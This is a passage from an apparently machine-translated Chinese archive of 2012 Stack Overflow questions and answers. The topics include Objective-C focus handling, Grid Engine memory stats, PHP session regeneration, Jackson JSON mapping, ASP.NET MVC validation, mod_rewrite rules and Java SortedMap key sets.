else if([self.textField3 isFirstResponder]){activeField = textView1;}
else if([self.textView1 isFirstResponder]){ activeField = textField1;}
} 
```

我希望有一个铸造类型的选项，但是我对如何在目标 C 中铸造有点困惑......但这听起来可能很愚蠢

```
activeField = ((UITextField) textView1); 
```

这就是我在 Java 中的投射方式，但似乎我似乎无法正确地理解他的语法。
我应该转换为 UIView，因为它们都继承自 UIView 吗？

先感谢您

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T20:46:36.817

我认为你的想法有一些问题。您将需要下降两个级别才能获得一个常见的超级类型。UITextField 和 UITextView 都是“可见”组件，因此它们继承自 UIView。它们都可以转换为 UIView 但不能互相转换。但这对您的问题没有帮助。我认为您可能也在与委派作斗争。

方法 textFieldDidBeginEditing: 是一个委托调用，它只适用于 UITextField。这就是为什么包含上述方法的类应该实现 UITextFieldDelegate。当您将焦点设置到 UITextField 时，UITextField 首先检查委托是否为 nil。如果委托属性包含一个类，则 UITextField 检查它是否显式地实现了 textFieldDidBeginEditing: 方法。如果该方法在委托中实现，则 UITextField 调用该方法。

UITextView 没有什么不同。但是 UITextView 甚至不知道 textFieldDidBeginEditing: 方法。它有自己的委托和自己的方法，执行与 textFieldDidBeginEditing: 相同的一般功能。此方法的 UITextView 版本称为 textViewDidBeginEditing:。与 UITextfield 一样，UITextView 检查委托不是 nil 并且它实现了 textViewDidBeginEditing:。如果满足这些要求，那么 UITextView 将 textViewDidBeginEditing。但是 UITextView 永远不会调用 textFieldDidBeginEditing:。

最后，对象不能被转换成它们不是的东西。它们只能被转换为它自己的类型或它的任何祖先。

您需要设置每个组件的方法（textFieldDidBeginEditing 和 textViewDidBeginEditing）才能使其正常工作。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-15T02:28:02.673

好的，所以你不需要为这个方法存储 activeField，所以唯一相关的代码就是你的 nextTextField: 方法。尝试将其更改为：

```
-(void) nextTextField:(id)sender{
          if([self.textField1 isFirstResponder]) {[textField2 becomeFirstResponder];}
     else if([self.textField2 isFirstResponder]) {[textField3 becomeFirstResponder];}
     else if([self.textField3 isFirstResponder]) {[textView1  becomeFirstResponder];}
     else if([self.textView1 isFirstResponder])  {[textField1 becomeFirstResponder];}
} 
```

您不需要转换为不同的类型或任何东西。

# unix - vmem 和 maxvmem

> ID：12427154
> 
> 赞同：2
> 
> 时间：2012-09-14T15:05:33.403
> 
> 标签：unix, sungridengine

我有一个关于 vmem 和 maxvmem 的问题。我在网上搜索过，但对这两个词的解释确实很混乱。我所做的是输入：

qstat -j 1154926 | grep vmem

输出为：cpu=00:05:25, mem=23.21121 GBs, io=2.70481, vmem=239.277M, maxvmem=351.359M

谁能帮我理解变量的含义？

最好的

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T01:10:00.617

vmem 变量表示该节点/队列组合上当前可用的虚拟内存。maxvmem 说明节点/队列组合可以作为最大可用虚拟内存呈现的内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:13:40.823

我发现这个[链接](http://www3.imperial.ac.uk/bioinfsupport/help/cluster_usage/monitoring_resource_usage)很有帮助。

```
qstat

qstat can provide more detailed information about a running job by passing it a job id specified by the '-j' argument:

[jamesa@codon sge_test]$ qstat -j 3804867
==============================================================
job_number:                 3804867
exec_file:                  job_scripts/3804867
submission_time:            Wed Jun 29 11:04:02 2011
owner:                      jamesa
uid:                        1001
group:                      bss-staff
gid:                        50001
sge_o_home:                 /home/jamesa
sge_o_log_name:             jamesa
sge_o_path:                 /usr/lib64/openmpi/bin:/usr/lib64/openmpi/1.4-gcc/bin:/opt/sge/6_2u5_1/bin/lx26-amd64:/usr/lib64/qt-3.3/bin:/usr/kerberos/bin:/usr/local/bin:/bin:/usr/bin:/usr/lib/jvm/java/bin:/usr/lib/jvm/jre/bin:/usr/biosoft/bin:/usr/biosoft/perl_modules/bioperl/current/bin:/usr/biosoft/packages/emboss/current/bin:/home/jamesa/bin
sge_o_shell:                /bin/bash
sge_o_workdir:              /home/jamesa/sge_test
sge_o_host:                 codon
account:                    sge
cwd:                        /home/jamesa/
sge_testmerge:                      y
hard resource_list:         h_rt=3600,h_vmem=2G
mail_list:                  jamesa@codon.bioinformatics.ic.ac.uk
notify:                     FALSE
job_name:                   blast
jobshare:                   0
env_list:                  
script_file:                blast.sh
usage    1:                 cpu=00:01:37, mem=78.06343 GBs, io=0.00002, vmem=925.562M, maxvmem=1.012G
scheduling info:            There are no messages available

You can see the resources you requested at submission time on the 'hard_resource_list' line of the qstat output. The actual resources used by the job at the time qstat were executed are shown in the 'usage' line.
Email Reporting

A summary of the jobs resource usage can be obtained by requesting an email report following the jobs completion, using the '-m e' qsub directive (see advanced submission options for details). An example email report is show below.

Job 3804869 (blast) Complete
  User             = jamesa
  Queue            = 3day_16@bss-node11.cluster.bioinformatics.ic.ac.uk
  Host             = bss-node11.cluster.bioinformatics.ic.ac.uk
  Start Time       = 06/29/2011 11:26:08
  End Time         = 06/29/2011 11:30:43
  User Time        = 00:03:51
  System Time       = 00:00:12
  Wallclock Time   = 00:04:35
  CPU              = 00:04:04
  Max vmem         = 1.012G
  Exit Status      = 0

The total memory used is indicated by the 'Max vmem' field, while the total runtime is reported as 'Wallclock Time'. Care should be taken when submitting a large number of jobs with email reporting enabled, since you may find yourself recieving several thousand reports in individual emails. 
```

# session-hijacking - 使用 Session_regenerate_id()

> ID：12427156
> 
> 赞同：0
> 
> 时间：2012-09-14T15:05:35.397
> 
> 标签：session-hijacking

为什么总是建议在创建用户会话之前使用**session_regenerate_id() 。**根据我的理解，一旦创建了用户会话 id，就应该使用 session_regenerate_id()，我们需要重新生成它，以减轻黑客的会话固定攻击。

请推荐！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-02T22:25:33.997

我不确定你从哪里得到推荐，但[session_regenerate_id](http://php.net/session_regenerate_id#refsect1-function.session-regenerate-id-examples)手册显示它在 session_start 之后使用，所以你的假设是正确的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-11T15:52:36.303

从我读过的所有内容中，必须先调用 session_start() 。主要思想是每次都创建一个新的 id，这样如果黑客在同一个网络上，他们就没有静态 id 来访问您的站点。这是如何完成的一个很好的解释。

[https://youtu.be/8dMsHmlxY0s](https://youtu.be/8dMsHmlxY0s)

这是一个很好的答案，比视频更详细：

[https://stackoverflow.com/a/37492488/2654453](https://stackoverflow.com/a/37492488/2654453)

# ant - 使用 Ant 进行 S3 上传

> ID：12427159
> 
> 赞同：3
> 
> 时间：2012-09-14T15:05:44.480
> 
> 标签：ant, amazon-s3

我尝试实现[awstasks 类](http://code.google.com/p/awstasks/)，以通过 ant 脚本将文件上传到 S3 存储桶。

下载所有依赖项并使用以下代码：

```
<taskdef name="S3Upload" classname="dak.ant.taskdefs.S3Upload">
<classpath refid="classpath.compile"/>
</taskdef>

    <target name="final2S3">
        <basename property="customer.id" file="${basedir}"/>
        <basename property="customer.name" file="${basedir.parent.parent}"/>
        <basename property="customer.campaign" file="${basedir.parent}"/>
        <basename property="customer.final" file="${basedir.parent}\_final\${customer.id}\"/>

        <S3Upload verbose="true"
                        accessId="${aws.accessId}"
                        secretKey="${aws.secretKey}"
                        bucket="${aws.bucket}\${customer.id}"
                        publicRead="true">

                <fileset dir="${customer.final}">
                    <include name="**/*.json"/>
                    <include name="**/*.swf"/>
                </fileset>
        </S3Upload>
    </target> 
```

我收到以下错误：

> `Reference classpath.compile not found.`

我尝试将属性 classpath.compile 设置为 Ant 主页中的 lib 文件夹，但没有任何变化。

# formatting - 自动格式化程序和符号，如ñ

> ID：12427161
> 
> 赞同：0
> 
> 时间：2012-09-14T15:05:50.310
> 
> 标签：formatting, aptana, aptana3

在 Aptana（带有 Aptana Studio 插件 3.1.3 的 Eclipse 3.7.2）中，当我激活自动格式化程序（ctrt + shift + f）并且 css 文件包含一个字母`ñ`时，格式化程序会换行，如何改变这种行为？

在带有符号的行中，aptana 标记`Syntax error: unexpected token ñ`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T16:34:52.430

您可以使用 scape 字符添加其他字符，例如`ñ` with `\ñ`。

# validation - CakePHP JSON Post 验证不起作用？

> ID：12427164
> 
> 赞同：0
> 
> 时间：2012-09-14T15:05:51.000
> 
> 标签：validation, cakephp, cakephp-2.1

我正在使用 CakePHP 2.1.1，虽然我使用表单助手的方法，例如我的用户控制器中的 add 方法正确验证，但我无法让控制器中的 mobile_register 方法进行验证，即使数据是失踪。

这是我的 mobile_register 方法：

```
public function mobile_register() {

    if ($this->request->is('post')) {
        $jsonData = file_get_contents("php://input");

        if(isset($jsonData) && !empty($jsonData)){
            $data = json_decode($jsonData,true);    
            $data = $this->User->configureUser($data);
            $this->User->create();

            if($this->User->save($data)){
                $jsonResponse = array('status' => 'OK', 'token' => $data['User']['token'], 'message' =>'SUCCESS');
            }else{
                $errors = $this->User->validationErrors;
                $this->log($errors,'errors');
                $jsonResponse = array('status' => 'ERROR','message' => $errors);
            }
        }
    }else{

        $jsonResponse = array('status' => 'ERROR','message' => 'API method expects POST data');
    }

    $this->set('response' , $jsonResponse);

} 
```

我一直在使用 curl 来测试我的方法，尽管发布了以下数据，但它始终可以保存：

```
[User] => Array
    (
        [firstname] => Andy
        [token] => cc42030bbb49faf2cf0393418036e44f
        [role] => user
    )

 curl -H "Accept: application/json" -H "Content-type: application/json" -X POST -d '{"User":{"firstname":"Andy"}}' url/users/mobile_register 
```

我的模型中的验证规则是：

```
public $validate = array(
    'username' => array(
        'username-1' => array(
            'rule' => array('notempty'),
            'message' => 'Username is required',
        ),
        'username-2' => array(
            'rule' => 'alphaNumeric',
            'message' => 'Usernames must only contain letters and numbers.',
        ),
    ),
    'password' => array(
        'password-1' => array(
            'rule' => array('notempty'),
            'message' => 'Password is required',
        ),
        'password-2' => array(
            'rule' =>  array('between', 5, 15),
            'message' => 'Passwords must be between 5 and 15 characters long.',
        ),

    ),
    'firstname' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Forename is required'
        ),
    ),
    'surname' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Surname is required',
        ),
    ),
    'email' => array(
        'email-1' => array(
            'rule'    => 'notempty',
            'message' => 'Email is required',
         ),
        'email-1' => array(
            'rule'    => 'email',
            'message' => 'Please enter a valid email',
         )
    )   

); 
```

我错过了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T21:01:20.223

这个解决方案的更好方法可能是充分利用“required”和“allowEmpty”验证选项：

[CakePhp 的数据验证](http://book.cakephp.org/2.0/en/models/data-validation.html#required)

这就是解决我的问题的方法，我认为这与我请求操作的方式有关，但实际上我什至没有设置我想要验证的字段。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-05T05:55:47.757

我想到了。基本上我了解到，如果您不通过这些字段，那么它们将不会被验证。

# java - 使用 ObjectMapper 更改字段大小写

> ID：12427167
> 
> 赞同：22
> 
> 时间：2012-09-14T15:05:54.827
> 
> 标签：java, json, jackson

我想我需要创建一个专家`ObjectMapper`并且找不到任何示例代码来启动该过程。

JSON 的创建者正在使用`.Net`和`public`属性，因此使用带有大写首字母的字段名称。我正在将 JSON 解析为 POJO，所以我想使用小写的首字母。

在他们的最后：

```
 public class Facet
    {
        public string Name { get; set; }
        public string  Value { get; set; }
    } 
```

因此，我必须拥有：

```
 public class Facet {
        public String Name;
        public String Value;
    } 
```

我更喜欢：

```
 public class Facet {
        public String name;
        public String value;
    } 
```

我可以用一个来完成`ObjectMapper`吗？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-09-14T18:19:43.910

您的第一个问题可以通过`@JsonProperty`注释非常简单地解决：

```
// java-side class
public class Facet
{
    @JsonProperty("Name")
    public String name;

    @JsonProperty("Value")
    public String value;
} 
```

现在`ObjectMapper`将匹配不同大小写的字段名称。如果你不想在你的类中添加注释，你可以创建一个 Mix-in 类来*代替*你的`Facet`：

```
public class FacetMixIn
{
    @JsonProperty("Name")
    public String name;

    @JsonProperty("Value")
    public String value;
}

objectMapper.getDeserializationConfig().addMixInAnnotations(Facet.class, FacetMixIn.class); 
```

这将实现相同的目的，而无需在您的`Facet`类中添加额外的注释。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-01-02T21:25:24.740

除了注释每个字段，Jackson`ObjectMapper`可以配置为使用内置或自定义[PropertyNamingStrategy](http://fasterxml.github.com/jackson-databind/javadoc/2.1.0/com/fasterxml/jackson/databind/PropertyNamingStrategy.html)，以在 Java 属性/字段名称和 JSON 元素名称之间应用一致的转换。

例如：

```
myObjectMapper.setPropertyNamingStrategy(PascalCaseStrategy); 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2016-08-06T15:04:19.260

这个问题可以这样解决`Jackson 2.5.0`：

```
ObjectMapper mapper = new ObjectMapper();
mapper.configure(MapperFeature.ACCEPT_CASE_INSENSITIVE_PROPERTIES, true); 
```

> **从javadoc：**
> 
> `com.fasterxml.jackson.databind.MapperFeature.ACCEPT_CASE_INSENSITIVE_PROPERTIES`
> 
> 允许对传入 JSON 进行更宽容的反序列化的功能。如果启用，bean 属性将使用它们的小写等效项进行匹配，这意味着任何大小写组合（传入和匹配的名称由小写规范化）都应该起作用。
> 
> 请注意，由于传入的属性名称在比较之前需要小写，因此存在额外的性能开销，对于有大写字母的情况。然而，已经是小写的名称的开销应该可以忽略不计。
> 
> 默认情况下禁用该功能。
> 
> 自：2.5

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-05-01T22:34:58.073

只是快速更新，因为我正在寻找相同的答案和代码片段 objectMapper.setPropertyNamingStrategy(PropertyNamingStrategy.SNAKE_CASE);

# asp.net-mvc-3 - 如何在局部视图上使用 IValidatableObject

> ID：12427169
> 
> 赞同：0
> 
> 时间：2012-09-14T15:06:03.383
> 
> 标签：asp.net-mvc-3, validation, viewmodel, partial-views, ivalidatableobject

我似乎无法弄清楚**如何验证将部分 ViewModel 作为子对象的 ViewModel 的部分视图片段**。这是我最低级别的部分，它总是作为其他表单标签中的部分视图使用：

```
namespace MVC3App.ViewModels
{
    public class Payment : IValidatableObject
    {
        public decimal Amount { get; set; }
        public int CreditCardNumber { get; set; }

        public IEnumerable<ValidationResult> Validate(ValidationContext validationContext)
        {
            if (Amount < 20)
                yield return new ValidationResult("Please pay more than $20", new string[] { "Amount" });
        }
    }
} 
```

这是包含它的“主要”视图模型：

```
namespace MVC3App.ViewModels
{
    public class NewCustomerWithPayment :IValidatableObject
    {
        public string Name { get; set; }
        public int Age { get; set; }
        public ViewModels.Payment PaymentInfo { get; set; }

        public IEnumerable<ValidationResult> Validate(ValidationContext validationContext)
        {
            if (Age < 18)
                yield return new ValidationResult("Too young.", new string[] { "Age" });
        }
    }
} 
```

对于 NewCustomerWithPayment 的视图，我有这个：

```
@model MVC3App.ViewModels.NewCustomerWithPayment
@using (Html.BeginForm()) {
    @Html.ValidationSummary(true)
    <fieldset>
        <legend>NewCustomerWithPayment</legend>

        <div class="editor-label">
            @Html.LabelFor(model => model.Name)
        </div>
        <div class="editor-field">
            @Html.EditorFor(model => model.Name)
            @Html.ValidationMessageFor(model => model.Name)
        </div>

        <div class="editor-label">
            @Html.LabelFor(model => model.Age)
        </div>
        <div class="editor-field">
            @Html.EditorFor(model => model.Age)
            @Html.ValidationMessageFor(model => model.Age)
        </div>
    </fieldset>
    @Html.Partial("Payment")
    <p><input type="submit" value="Create" /></p>
} 
```

并且部分视图“付款”总是在另一个 Html.Beginform 标记中呈现，它只有这个：

```
@model MVC3App.ViewModels.Payment
<h2>Payment</h2>
<fieldset>
    <legend>Payment</legend>

    <div class="editor-label">
        @Html.LabelFor(model => model.Amount)
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => model.Amount)
        @Html.ValidationMessageFor(model => model.Amount)
    </div>

    <div class="editor-label">
        @Html.LabelFor(model => model.CreditCardNumber)
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => model.CreditCardNumber)
        @Html.ValidationMessageFor(model => model.CreditCardNumber)
    </div>
</fieldset> 
```

**我的问题是我无法让“付款”视图模型上的验证工作。任何有使用 IValidatableObject 经验的人都可以在呈现为部分视图的 ViewModel 上加入并给我一个有效的验证模式吗？如果必须，我可以在没有 JavaScript 验证的情况下生活。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:37:02.047

这些答案都有一些很好的信息，但我的直接问题是通过使用这个来解决的：

```
@Html.EditorFor(model => model.PaymentInfo) 
```

而不是这个：

```
Html.Partial("Payment", Model.PaymentInfo) 
```

我很惊讶这有效，但确实有效。**EditorFor 助手像 Html.Partial 一样渲染出局部视图，并自动连接到验证中。**出于某种原因，它确实在子模型上调用了两次验证（在我的示例中为付款），这似乎是其他一些人报告的问题（http://mvcextensions.codeplex.com/workitem/10），所以我必须在每个模型上包含一个布尔值“HasBeenValidated”，并在 Validate 调用开始时检查它。

**更新：**您必须将视图移动到 /Views/Shared/ 下的 EditorTemplates 文件夹，以便 EditorFor 助手使用该视图。否则，EditorFor 将为您提供类型的默认编辑字段。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T20:06:54.063

这是一个用于复选框的自定义验证器的蹩脚示例:) 我可能会编写一个自定义验证器或使用正则表达式。这可能会让你走上正确的道路并且更容易。

```
 [AttributeUsage(AttributeTargets.Property, AllowMultiple = false, Inherited = false)]
public class CheckBoxMustBeTrueAttribute : ValidationAttribute, IClientValidatable
{
    #region IClientValidatable Members

    public IEnumerable<ModelClientValidationRule> GetClientValidationRules(ModelMetadata metadata,
                                                                           ControllerContext context)
    {
        yield return new ModelClientValidationRule
                         {
                             ErrorMessage = FormatErrorMessage(metadata.GetDisplayName()),
                             ValidationType = "requiredcheckbox"
                         };
    }

    #endregion

    public override bool IsValid(object value)
    {
        if (value is bool)
        {
            return (bool) value;
        }
        return true;
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T23:40:01.190

很可能`IValidatableObject`仅在根模型上被识别。`Validate`您可以从根模型调用内部模型方法：

```
public class NewCustomerWithPayment :IValidatableObject {
   ...
   public ViewModels.Payment PaymentInfo { get; set; }

   public IEnumerable<ValidationResult> Validate(ValidationContext validationContext)
   {
      if (Age < 18)
         yield return new ValidationResult("Too young.", new string[] { "Age" });

      if (this.PaymentInfo != null)
         yield return this.PaymentInfo.Validate(validationContext);
   }
} 
```

注意：不确定上述是否编译。

# java - 如何在后台继续监听 Android 上的推送通知

> ID：12427171
> 
> 赞同：5
> 
> 时间：2012-09-14T15:06:10.320
> 
> 标签：java, android, android-service, android-c2dm, google-cloud-messaging

我正在研究 Android 中的推送通知。现在的问题是我想在应用程序启动后立即在后台运行我的推送通知，因为我不知道服务器何时将数据推送到设备。

主要要求是我们的公司应用程序有超过 10 个活动，并且根据收到的通知，我必须将相关活动带到前台，以便用户可以对其执行操作或在后台执行一些静默操作，而不管活动在前台。

有人可以建议我如何实现这种类型的要求。我需要在服务中进行吗？

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-14T15:31:02.233

无需运行 Android 设备上的 Android 应用程序即可接收消息。系统会在消息到达时通过 Intent 广播唤醒 Android 应用程序，只要应用程序设置了正确的广播接收器和权限。

看看这个；

[http://developer.android.com/guide/google/gcm/gcm.html](http://developer.android.com/guide/google/gcm/gcm.html)

当从 gcm 服务器收到消息时

onMessage(Context context, Intent intent)：GCMIntentService 的方法被触发，

所以你在那里写你的代码

从这里举个例子

[https://github.com/ketanpatel25/GCM-Demo/tree/master/gcm](https://github.com/ketanpatel25/GCM-Demo/tree/master/gcm)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T16:00:54.527

您尝试做的事情违背了推送通知的目的。在推送通知中，服务器通过 Google API 发送消息。然后，这些 API 会向您的应用程序发送一条广播消息，您可以收听该消息。持续保持应用程序在后台打开并向服务器请求新消息称为轮询。

阅读[GCM 文档](http://developer.android.com/guide/google/gcm/gcm.html)。每当您收到消息时，Android 都会调用 onMessage(); GCMIntentService 的方法。

# php - Mod重写规则不起作用

> ID：12427173
> 
> 赞同：-1
> 
> 时间：2012-09-14T15:06:21.807
> 
> 标签：php, .htaccess, mod-rewrite, rule

我正在使用 mod rewrite，但我的代码不起作用。它工作了一段时间。我已经剥离了代码。

*.htaccess*

```
RewriteEngine On 
RewriteBase / 
RewriteRule ^/(.*)/$ index.php?test=$1 
```

*PHP*

```
<?php
var_dump($_GET['test']);
?> 
```

如果我去`index.php`它显示`NULL`。

我不明白为什么它不再起作用了。我希望你能帮助我。

Ps 我已经通过使用.htaccess 制作登录表单来测试是否加载了.htaccess 文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:09:15.710

你需要去掉第一个斜线：

```
RewriteRule ^(.*)/$ index.php?test=$1 
```

即使这样，您的规则也仅在您输入以正斜杠结尾的 url 时适用，例如：

```
/index.php/ 
```

如果您希望它与任何 url 一起使用，您还需要删除最后一个斜杠：

```
RewriteRule ^(.*)$ index.php?test=$1 
```

**编辑：**为避免重写现有文件和目录，您需要添加一些条件：

```
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php?test=$1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:08:15.827

您需要删除规则中的第一个斜杠

```
RewriteEngine On 
RewriteBase / 
RewriteRule ^(.*)/$ index.php?test=$1 
```

# asp.net-mvc-3 - ASP.NET MVC 嵌套查询参数

> ID：12427181
> 
> 赞同：3
> 
> 时间：2012-09-14T15:06:51.130
> 
> 标签：asp.net-mvc-3

好的，这有点棘手。我在 ASP.NET MVC 3 中实现了一个论坛。用户想要发布一个问题，如果没有登录，他会被重定向到登录页面。将 returnUrl 参数传递到登录页面。但是，returnUrl 参数还包含另一个 returnUrl 参数。所以传递给登录页面的 returnUrl 参数如下所示：

```
"/forum/NewTopic?boardId=8&returnUrl=%2Fforum%2FBoard%2F8" 
```

但是，Request["returnUrl"] 看起来像这样：

```
"/forum/NewTopic?boardId=8&returnUrl=%2Fforum%2FBoard%2F8,/forum/Board/8" 
```

注意末尾的附加位，不应该存在吗？如何获得正确的 returnUrl？

但是，当控制器的操作方法中有一个字符串 returnUrl 参数时，这将具有正确的 returnUrl 值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:14:10.150

我在 MVC3 中也遇到了这个问题，检查重定向页面是否为“登录”，设置一个标志，而不是添加`returnUrl`参数（这是最后附加的位）。

这样它就不会再次被填充。

# javascript - 如何在 IE8 和 IE9 中使用 JavaScript 或 JQuery 获取动态创建的输入的输入值和选定值？

> ID：12427182
> 
> 赞同：0
> 
> 时间：2012-09-14T15:06:51.783
> 
> 标签：javascript, jquery

我使用 getElementById() 在 IE 7 中工作，但在 IE8 和 IE9 中不起作用。我正在做的是我需要对选择框进行验证，以查看它们是否是必需的，并检查他们选择做什么来做其他事情。我还需要检查输入框以查看值是什么，并且它也是必需的。

```
function saveTest(){
var startNumber=0;
var endNumber=3;

// Works
alert(document.myForm.mySelect_1.value);

for (i = startNumber; i <= endNumber; i++) {
  // I know this is not right but I am trying everything
      alert(document.myForm.mySelect_+i.value);

      // Using JQuery to try to solve the issue and this does not work for me.
      alert($('#mySelect_'+i).val());

  } 
} 
```

我知道这些不是动态创建的，但这只是为了帮助我找到这个问题的答案。我正在创建更多选择

```
 <input name="myText_1" id="myText_1" value="">
    <br />
    <select name="mySelect_1" id="mySelect_1">
        <option value="0">- - - Select One - - -</option>
        <option value="1">item 1</option>
        <option value="2">item 2</option>
        <option value="3">item 3</option>
        <option value="4">item 4</option>
        <option value="5">item 5</option>
    </select>
    <br />

    <input name="myText_2" id="myText_2" value="">
    <br />
    <select name="mySelect_2" id="mySelect_2">
        <option value="0">- - - Select One - - -</option>
        <option value="1">item 1</option>
        <option value="2">item 2</option>
        <option value="3">item 3</option>
        <option value="4">item 4</option>
        <option value="5">item 5</option>
    </select>
    <br />

    <input name="myText_3" id="myText_3" value="">
    <br />
    <select name="mySelect_3" id="mySelect_3">
        <option value="0">- - - Select One - - -</option>
        <option value="1">item 1</option>
        <option value="2">item 2</option>
        <option value="3">item 3</option>
        <option value="4">item 4</option>
        <option value="5">item 5</option>
    </select>
    <br />

<a href="javascript:saveTest();">Save</a> 
```

如果我不够清楚，请告诉我。我会尽力解释任何你不明白的。

谢谢你的时间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:08:09.203

以下行不正确；您正在尝试连接一个变量名，调用`mySelect_`一个整数：

```
alert(document.myForm.mySelect_+i.value); 
```

相反，您应该使用关联数组语法：

```
alert(document.myForm['mySelect_'+i].value); 
```

此外，在同一个循环中，您应该从而`1`不是从 开始`0`，因为没有名为 的元素`mySelect_0`。

这是一个有效的**[演示](http://jsfiddle.net/uKGGd/)**。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:15:21.847

**您已使用名称**创建下拉菜单

 **尝试使用

```
$('select[name=mySelect_'+i+']').val(); 
```

别的

```
$("#id option:selected").text() 
```**

# matlab - strrep MAtlab 函数

> ID：12427184
> 
> 赞同：0
> 
> 时间：2012-09-14T15:07:02.190
> 
> 标签：matlab

我想删除第一个字母并将第二个字母替换为小写

示例： `a = 'iSvalid'`到`a = 'svalid'`

我试过`strrep( a,'i','')`which give`'Svalid'`但我也想将第一个大写字母转换为小写。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:10:30.810

```
>> a = 'iSvalid';
>> b = strcat(lower(a(2)), a(3:end))

b =

svalid 
```

您还可以使用括号：

```
>> b = [lower(a(2)) a(3:end)]

b =

svalid 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:16:49.553

对于一个通用的解决方案，例如在字符串的单元数组上工作，或者在同一字符串中的多个单词上工作，有`regexprep`：

```
a = 'iSvalid';
%# discard first letter of word, replace second by lower-case version
b = regexprep(a,'\<\w(\w)','${lower($1)}')

b =
svalid 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T15:27:42.180

这是我的版本 os @petrichor 的答案。我已经分离了每个函数以使代码更具可读性。

```
a = 'isValid';

b = a(2:end);
b(1) = lower(b(1)); 
```

# java - SortedMap 的 keySet() 是否可以始终安全地转换为 SortedSet？

> ID：12427185
> 
> 赞同：10
> 
> 时间：2012-09-14T15:07:04.653
> 
> 标签：java, collections

我有一个[SortedMap](http://docs.oracle.com/javase/6/docs/api/java/util/SortedMap.html)，根据其键的自然顺序排序。我可以安全地将其 keySet() 转换为[SortedSet](http://docs.oracle.com/javase/6/docs/api/java/util/SortedSet.html)，而不会冒无效转换异常的风险。

也就是说，下面会抛出吗？

```
SortedMap<K, V> map = ...;
SortedSet<K> set = (SortedSet<K>) map.keySet(); 
```

如果答案是“取决于 SortedMap 的实现”，那么对于[TreeMap](http://docs.oracle.com/javase/6/docs/api/java/util/TreeMap.html)来说这至少是安全的吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-14T15:11:33.330

一般来说，没有，因为`SortedMap`它没有记录在 javadoc 中。

但是，`TreeMap`也实现`NavigableMap`了，它使用 a`NavigableSet`作为键集并`NavigableSet`扩展`SortedSet`...

所以你可以做的是：

```
NavigableMap<K, V> map = ...; //can be a TreeMap or a ConcurrentSkipListMap
SortedSet<K> set = map.navigableKeySet(); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-09-14T15:19:11.923

```
SortedMap<String, String> treeMap = new TreeMap<String, String>();
// prints true
System.out.println(treeMap.keySet() instanceof SortedSet);   
// prints false
System.out.println(Collections.synchronizedSortedMap(treeMap).keySet() instanceof SortedSet); 
```

所以答案是否定的。

`TreeMap.keySet()`返回 a `SortedSet`，但 javadoc 不保证。

`NavigableMap`extends 接口`SortedMap`有一个`navigableSet()`方法，该方法返回一个`NavigableSet`extends `SortedSet`。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-14T15:09:12.040

鉴于文档不能保证它将是 a `SortedSet`，即使*当前的实现*以这种方式实现它（我还没有检查它们是否这样做），这并不意味着它是你应该假设的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-14T15:14:35.283

不，它不安全，因为文档没有说它是安全的。这应该是安全的：

`SortedSet<K> set = new TreeSet<K>(map.keySet());`

# cordova - 从 Cordova 1.5 升级到 2.0.0

> ID：12427194
> 
> 赞同：0
> 
> 时间：2012-09-14T15:07:44.687
> 
> 标签：cordova

嗨，我无法将我的 Cordova 版本升级到 2.0.0，我想知道是否有人可以给我一些建议。我运行了安装程序，从我读到的内容应该升级了我之前安装的版本，但填充仍然称为 Cordova1.5。

我错过了这个过程的某些部分吗？

谢谢

**编辑**

事实证明它确实安装正确，但 Cordova 2.0 并没有像以前升级那样替换旧版本。相反，有必要通过新的命令行工具创建新的 Cordova 2.0 项目。更多信息[在这里](http://shazronatadobe.wordpress.com/2012/07/20/improvements-in-cordova-2-0-0-for-ios/)

# javascript - 使用键盘时 Firefox 滚动条没有聚焦

> ID：12427197
> 
> 赞同：0
> 
> 时间：2012-09-14T15:07:56.480
> 
> 标签：javascript, firefox, html, javascript-events

我正在处理一个滚动溢出的 div。预期的行为是当可滚动的 div 通过单击 div 或单击滚动条获得焦点时，将启用键盘命令（即光标键、向上翻页、向下翻页等）。这是一些示例测试代码

```
<html>
    <head>
        <script type="text/javascript">
            function handle() { console.log("fired"); };
        </script>
    </head>
    <body>
        <div style="width:200px; height:500px; overflow-y: scroll; border: 1px solid gray;" onscroll="handle()">
            <div style="width:150px; height:2000px;">&nbsp;</div>
        </div>
    </body>
</html> 
```

